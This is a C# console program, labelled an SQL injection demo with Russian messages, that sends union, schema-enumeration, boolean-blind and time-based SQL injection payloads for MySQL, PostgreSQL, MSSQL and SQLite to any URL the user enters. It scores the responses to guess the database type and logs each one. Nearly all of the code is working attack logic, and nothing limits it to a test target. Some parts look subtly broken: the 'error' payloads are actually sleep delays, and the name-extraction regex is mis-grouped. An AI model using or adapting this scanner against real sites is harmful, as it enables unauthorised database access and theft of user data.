using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO;

namespace SqlInjectionDemo
{
    enum DatabaseType
    {
        MySql,
        SQLite,
        MsSql,
        PostgreSql
    }

    enum AttackType
    {
        Union,
        UnionTable,
        UnionColumn,
        Error,
        Blind,
        Time
    }

    class Program
    {
        private static readonly HttpClient Client = new HttpClient();
        private static readonly Dictionary<DatabaseType, int> DbSuccessScores = new Dictionary<DatabaseType, int>
        {
            { DatabaseType.MySql, 0 },
            { DatabaseType.SQLite, 0 },
            { DatabaseType.MsSql, 0 },
            { DatabaseType.PostgreSql, 0 }
        };

        private static readonly List<string> TableWordlist = new List<string>
        {
            "users", "admin", "posts", "comments", "products", "orders", "customers",
            "employees", "accounts", "profiles", "sessions", "logs", "settings"
        };

        private static readonly List<string> ColumnWordlist = new List<string>
        {
            "id", "username", "password", "email", "name", "first_name", "last_name",
            "role", "is_admin", "created_at", "updated_at", "phone", "address"
        };

        private static readonly string LogFilePath = "log.txt";
        private static readonly HashSet<string> KnownUsers = new HashSet<string> { "admin", "user1", "user2" };
        private static readonly HashSet<string> FoundTables = new HashSet<string>();

        static async Task Main(string[] args)
        {
            Console.WriteLine("=== Демонстрация SQL-инъекций ===");
            Console.Write("Введите URL эндпоинта (например, http://localhost:8081/search.php): ");
            string url = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(url))
            {
                LogError("URL не указан. Завершение.", true);
                return;
            }

            File.WriteAllText(LogFilePath, $"[{DateTime.Now}] Начало тестирования URL: {url}\n\n");
            FoundTables.Clear();

            LogInfo("Запуск тестирования всех атак...", true);

            try
            {
                await TestAllAttacks(url);
                DetermineDatabaseType();
            }
            catch (Exception ex)
            {
                LogError($"Критическая ошибка: {ex.Message}", true);
            }
        }

        static async Task TestAllAttacks(string url)
        {
            foreach (DatabaseType dbType in Enum.GetValues(typeof(DatabaseType)))
            {
                LogInfo($"Тестирование БД: {dbType}", true);
                foreach (AttackType attackType in Enum.GetValues(typeof(AttackType)))
                {
                    await ExecuteAttack(dbType, attackType, url);
                }
            }
        }

        static async Task ExecuteAttack(DatabaseType dbType, AttackType attackType, string url)
        {
            if (attackType == AttackType.UnionTable || attackType == AttackType.UnionColumn)
            {
                var payloads = GeneratePayloads(dbType, attackType);
                foreach (var payload in payloads)
                {
                    await SendRequest(dbType, attackType, url, payload);
                }
            }
            else
            {
                string payload = GetPayload(dbType, attackType);
                if (string.IsNullOrEmpty(payload))
                {
                    LogWarning($"Пейлоад для {dbType} и {attackType} не найден.", false);
                    return;
                }
                await SendRequest(dbType, attackType, url, payload);
            }
        }

        static async Task SendRequest(DatabaseType dbType, AttackType attackType, string url, string payload)
        {
            string fullUrl = $"{url}?name={Uri.EscapeDataString(payload)}";
            LogInfo($"[{attackType} для {dbType}] Проверка пейлоада: {payload}", false);

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            try
            {
                HttpResponseMessage response = await Client.GetAsync(fullUrl);
                stopwatch.Stop();
                string content = await response.Content.ReadAsStringAsync();

                AnalyzeResult(dbType, attackType, content, stopwatch.ElapsedMilliseconds, payload);
            }
            catch (Exception ex)
            {
                stopwatch.Stop();
                LogError($"Ошибка при выполнении {attackType} для {dbType}: {ex.Message}", true);
            }
        }

        static void AnalyzeResult(DatabaseType dbType, AttackType attackType, string content, long elapsedMs, string payload)
        {
            bool success = false;
            string consoleMessage = $"Результат {attackType} для {dbType}: ";
            string logMessage = $"[{DateTime.Now}] Результат {attackType} для {dbType}\n" +
                               $"Пейлоад: {payload}\n" +
                               $"Время ответа: {elapsedMs} мс\n" +
                               $"Контент ответа:\n{content}\n";

            switch (attackType)
            {
                case AttackType.Union:
                    consoleMessage += content.Contains("hacked") ? "Успех: Union-инъекция сработала!" : "Не сработало.";
                    logMessage += content.Contains("hacked") ? "Успех: Union-инъекция сработала!\n" : "Не сработало.\n";
                    if (content.Contains("hacked"))
                    {
                        success = true;
                        DbSuccessScores[dbType] += 2;
                    }
                    break;
                case AttackType.UnionTable:
                    string tableName = ExtractNameFromPayload(payload);
                    if (content.Contains(tableName) && TableWordlist.Contains(tableName) && !KnownUsers.Contains(tableName))
                    {
                        success = true;
                        consoleMessage += $"Обнаружены таблицы: {tableName}";
                        logMessage += $"Обнаружены таблицы:\n- {tableName}\n";
                        FoundTables.Add(tableName);
                        DbSuccessScores[dbType] += 3;
                    }
                    else
                    {
                        consoleMessage += "Таблицы не найдены.";
                        logMessage += "Таблицы не найдены.\n";
                    }
                    break;
                case AttackType.UnionColumn:
                    if (!FoundTables.Any())
                    {
                        consoleMessage += "Пропущено: нет найденных таблиц.";
                        logMessage += "Пропущено: нет найденных таблиц.\n";
                        break;
                    }
                    string columnName = ExtractNameFromPayload(payload);
                    if (content.Contains(columnName) && ColumnWordlist.Contains(columnName) && !KnownUsers.Contains(columnName))
                    {
                        success = true;
                        consoleMessage += $"Обнаружены столбцы: {columnName}";
                        logMessage += $"Обнаружены столбцы:\n- {columnName}\n";
                        DbSuccessScores[dbType] += 3;
                    }
                    else
                    {
                        consoleMessage += "Столбцы не найдены.";
                        logMessage += "Столбцы не найдены.\n";
                    }
                    break;
                case AttackType.Error:
                    consoleMessage += content.Contains("error") || content.Contains("SQL") ? "Успех: Обнаружена ошибка SQL!" : "Не удалось вызвать ошибку.";
                    logMessage += content.Contains("error") || content.Contains("SQL") ? "Успех: Обнаружена ошибка SQL!\n" : "Не удалось вызвать ошибку.\n";
                    if (content.Contains("error") || content.Contains("SQL"))
                    {
                        success = true;
                        DbSuccessScores[dbType] += 1;
                    }
                    break;
                case AttackType.Blind:
                    consoleMessage += content.Contains("найден") || content.Contains("ID:") ? "Успех: Пользователь найден!" : "Пользователь не найден.";
                    logMessage += content.Contains("найден") || content.Contains("ID:") ? "Успех: Пользователь найден!\n" : "Пользователь не найден.\n";
                    if (content.Contains("найден") || content.Contains("ID:"))
                    {
                        success = true;
                        DbSuccessScores[dbType] += 1;
                    }
                    break;
                case AttackType.Time:
                    consoleMessage += elapsedMs > 5000 ? "Успех: Задержка обнаружена!" : "Задержка не обнаружена.";
                    logMessage += $"Время ответа: {elapsedMs} мс\n" +
                                  (elapsedMs > 5000 ? "Успех: Задержка обнаружена!\n" : "Задержка не обнаружена.\n");
                    if (elapsedMs > 5000)
                    {
                        success = true;
                        DbSuccessScores[dbType] += 2;
                    }
                    break;
            }

            logMessage += "----------------------------------------\n";
            File.AppendAllText(LogFilePath, logMessage);

            if (success)
                LogSuccess(consoleMessage, true);
            else
                LogWarning(consoleMessage, true);
        }

        static string ExtractNameFromPayload(string payload)
        {
            var match = Regex.Match(payload, @"'(\w+)',\s*'table|column'");
            return match.Success ? match.Groups[1].Value : string.Empty;
        }

        static void DetermineDatabaseType()
        {
            LogInfo("Определение типа БД...", true);
            string logMessage = $"[{DateTime.Now}] Определение типа БД\n";
            var bestDb = DatabaseType.MySql;
            int maxScore = 0;

            foreach (var pair in DbSuccessScores)
            {
                LogInfo($"БД {pair.Key}: {pair.Value} баллов", false);
                logMessage += $"БД {pair.Key}: {pair.Value} баллов\n";
                if (pair.Value > maxScore)
                {
                    maxScore = pair.Value;
                    bestDb = pair.Key;
                }
            }

            string result = maxScore > 0
                ? $"Наиболее вероятный тип БД: {bestDb} (баллы: {maxScore})"
                : "Тип БД не определён.";
            logMessage += $"{result}\n----------------------------------------\n";

            File.AppendAllText(LogFilePath, logMessage);

            if (maxScore > 0)
                LogSuccess(result, true);
            else
                LogWarning(result, true);
        }

        static List<string> GeneratePayloads(DatabaseType dbType, AttackType attackType)
        {
            var payloads = new List<string>();
            if (attackType == AttackType.UnionTable)
            {
                foreach (var table in TableWordlist)
                {
                    string payload = GenerateTablePayload(dbType, table);
                    if (!string.IsNullOrEmpty(payload))
                        payloads.Add(payload);
                }
            }
            else if (attackType == AttackType.UnionColumn)
            {
                foreach (var table in FoundTables)
                {
                    foreach (var column in ColumnWordlist)
                    {
                        string payload = GenerateColumnPayload(dbType, table, column);
                        if (!string.IsNullOrEmpty(payload))
                            payloads.Add(payload);
                    }
                }
            }
            return payloads;
        }

        static string GenerateTablePayload(DatabaseType dbType, string tableName)
        {
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return $"admin' UNION SELECT NULL, table_name, NULL, FALSE FROM information_schema.tables WHERE table_name = '{tableName}' --";
                case DatabaseType.PostgreSql:
                    return $"admin' UNION SELECT NULL, table_name, NULL, FALSE FROM information_schema.tables WHERE table_schema = 'public' AND table_name = '{tableName}' --";
                case DatabaseType.MsSql:
                    return $"admin' UNION SELECT NULL, name, NULL, 0 FROM sys.tables WHERE name = '{tableName}' --";
                case DatabaseType.SQLite:
                    return $"admin' UNION SELECT NULL, name, NULL, 0 FROM sqlite_master WHERE type='table' AND name = '{tableName}' --";
                default:
                    return null;
            }
        }

        static string GenerateColumnPayload(DatabaseType dbType, string tableName, string columnName)
        {
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return $"admin' UNION SELECT NULL, column_name, NULL, FALSE FROM information_schema.columns WHERE table_name = '{tableName}' AND column_name = '{columnName}' --";
                case DatabaseType.PostgreSql:
                    return $"admin' UNION SELECT NULL, column_name, NULL, FALSE FROM information_schema.columns WHERE table_schema = 'public' AND table_name = '{tableName}' AND column_name = '{columnName}' --";
                case DatabaseType.MsSql:
                    return $"admin' UNION SELECT NULL, name, NULL, 0 FROM sys.columns WHERE object_id = OBJECT_ID('{tableName}') AND name = '{columnName}' --";
                case DatabaseType.SQLite:
                    return $"admin' UNION SELECT NULL, name, NULL, 0 FROM pragma_table_info('{tableName}') WHERE name = '{columnName}' --";
                default:
                    return null;
            }
        }

        static string GetPayload(DatabaseType dbType, AttackType attackType)
        {
            switch (attackType)
            {
                case AttackType.Union:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                        case DatabaseType.PostgreSql:
                            return "admin' UNION SELECT NULL, 'hacked', 'hacked@example.com', TRUE --";
                        case DatabaseType.MsSql:
                            return "admin' UNION SELECT NULL, 'hacked', 'hacked@example.com', 1 --";
                        case DatabaseType.SQLite:
                            return "admin' UNION SELECT NULL, 'hacked', 'hacked@example.com', 1 --";
                        default:
                            return null;
                    }
                case AttackType.Error:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                            return "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --";
                        case DatabaseType.PostgreSql:
                            return "admin' AND (SELECT PG_SLEEP(5)) --";
                        case DatabaseType.MsSql:
                            return "admin' AND 1=1; WAITFOR DELAY '0:0:5' --";
                        case DatabaseType.SQLite:
                            return "admin' AND (SELECT LIKE('ABC', UPPER(HEX(RANDOMBLOB(2000000000)))) --";
                        default:
                            return null;
                    }
                case AttackType.Blind:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                        case DatabaseType.PostgreSql:
                            return "admin' AND 1=1 --";
                        case DatabaseType.MsSql:
                            return "admin' AND 1=1 --";
                        case DatabaseType.SQLite:
                            return "admin' AND 1=1 --";
                        default:
                            return null;
                    }
                case AttackType.Time:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                            return "admin' AND IF(1=1, SLEEP(5), 0) --";
                        case DatabaseType.PostgreSql:
                            return "admin' AND (SELECT PG_SLEEP(5) WHERE TRUE) --";
                        case DatabaseType.MsSql:
                            return "admin' AND 1=1; WAITFOR DELAY '0:0:5' --";
                        case DatabaseType.SQLite:
                            return "admin' AND (SELECT LIKE('ABC', UPPER(HEX(RANDOMBLOB(2000000000)))) --";
                        default:
                            return null;
                    }
                default:
                    return null;
            }
        }

        static void LogInfo(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[INFO] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [INFO] {message}\n");
        }

        static void LogSuccess(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[SUCCESS] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [SUCCESS] {message}\n");
        }

        static void LogWarning(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine($"[WARNING] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [WARNING] {message}\n");
        }

        static void LogError(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [ERROR] {message}\n");
        }
    }
}